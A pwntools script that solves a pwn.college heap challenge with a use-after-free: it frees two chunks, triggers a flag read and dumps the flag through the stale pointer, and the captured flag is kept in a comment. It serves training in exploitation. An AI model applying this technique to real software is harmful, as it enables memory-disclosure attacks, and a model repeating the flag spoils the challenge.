from pwn import *

def _malloc(index, size):
    io.sendlineafter(b": ", b"malloc")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Size: ",  str(size).encode())

def _free(index):
    io.sendlineafter(b": ", b"free")
    io.sendlineafter(b"Index: ", str(index).encode())

def _puts(index):
    io.sendlineafter(b": ", b"puts")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.recvuntil(b'Data: ')
    return io.recvline().decode()

def _read_flag():
    io.sendlineafter(b": ", b"read_flag")

s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
io = s.process("/challenge/babyheap_level3.1")

_malloc(0, 474)
_malloc(1, 474)

_free(0)
_free(1)

_read_flag()

flag = _puts(0)

s.close()
info("Flag: " + flag)
# pwn.college{I4fxJeHWauVm7dl01Sdb_PFosdv.0VN3MDLxIjNyEzW}